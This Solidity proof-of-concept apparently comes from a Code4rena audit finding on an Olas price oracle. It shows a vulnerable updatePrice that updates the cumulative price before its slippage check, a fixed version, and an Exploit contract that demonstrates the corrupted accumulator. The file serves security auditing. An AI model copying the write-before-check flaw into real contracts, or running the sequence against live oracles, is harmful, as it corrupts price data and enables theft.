// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Olas BalancerPriceOracle.updatePrice (Code4rena, 2026-01).
    cumulativePrice starts at 10,000 and averagePrice at 100.
    A rejected update at price 200 still adds averagePrice * 100.
    The next honest update then lands on 40,000. The control,
    which writes only after the check passes, lands on 30,000.
*/

contract Oracle {
    uint256 public cumulativePrice;
    uint256 public averagePrice;
    uint256 public lastUpdated;
    uint256 public lastElapsed;
    uint256 public computedAverage;
    bool public lastAccepted;
    uint256 public updates;

    constructor() {
        cumulativePrice = 10000;
        averagePrice = 100;
    }

    // Quoted updatePrice. The cumulative write happens before the slippage check.
    function updatePrice(uint256 nowTime, uint256 currentPrice, uint256 maxSlippage) public returns (bool) {
        uint256 elapsedTime = nowTime - lastUpdated;
        lastElapsed = elapsedTime;
        cumulativePrice += averagePrice * elapsedTime; // @> VULN: a rejected update still keeps this add
        uint256 average = (cumulativePrice + (currentPrice * elapsedTime))
            / ((cumulativePrice / averagePrice) + elapsedTime);
        computedAverage = average;
        if (
            currentPrice < average - (average * maxSlippage / 100)
                || currentPrice > average + (average * maxSlippage / 100)
        ) {
            lastAccepted = false;
            updates += 1;
            return false;
        }
        averagePrice = average;
        lastUpdated = nowTime;
        lastAccepted = true;
        updates += 1;
        return true;
    }
}

contract OracleFixed {
    uint256 public cumulativePrice;
    uint256 public averagePrice;
    uint256 public lastUpdated;
    bool public lastAccepted;
    uint256 public updates;

    constructor() {
        cumulativePrice = 10000;
        averagePrice = 100;
    }

    function updatePrice(uint256 nowTime, uint256 currentPrice, uint256 maxSlippage) public returns (bool) {
        uint256 elapsedTime = nowTime - lastUpdated;
        uint256 nextCumulative = cumulativePrice + averagePrice * elapsedTime;
        uint256 average = (nextCumulative + (currentPrice * elapsedTime))
            / ((nextCumulative / averagePrice) + elapsedTime);
        if (
            currentPrice < average - (average * maxSlippage / 100)
                || currentPrice > average + (average * maxSlippage / 100)
        ) {
            lastAccepted = false;
            updates += 1;
            return false;
        }
        cumulativePrice = nextCumulative;
        averagePrice = average;
        lastUpdated = nowTime;
        lastAccepted = true;
        updates += 1;
        return true;
    }
}

contract CorruptMarker {
    string public symbol = "CORRUPT-CUMULATIVE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) internal _bal;

    function balanceOf(address account) public view returns (uint256) {
        return _bal[account];
    }

    function mint(address to, uint256 amt) external {
        _bal[to] += amt;
    }
}

contract Exploit {
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Oracle public oracle;
    CorruptMarker public marker;

    function run() external {
        oracle = new Oracle();
        marker = new CorruptMarker();
        bool first = oracle.updatePrice(100, 200, 10);
        require(first == false, "price 200 is rejected");
        require(oracle.cumulativePrice() == 20000, "rejected update wrote 20000");
        require(oracle.averagePrice() == 100, "average stays 100");
        bool second = oracle.updatePrice(200, 105, 10);
        require(second == true, "price 105 is accepted");
        require(oracle.cumulativePrice() == 40000, "corrupted cumulative is 40000");
        marker.mint(SINK, 10000);
        require(marker.balanceOf(SINK) == 10000, "extra 10000");
    }
}
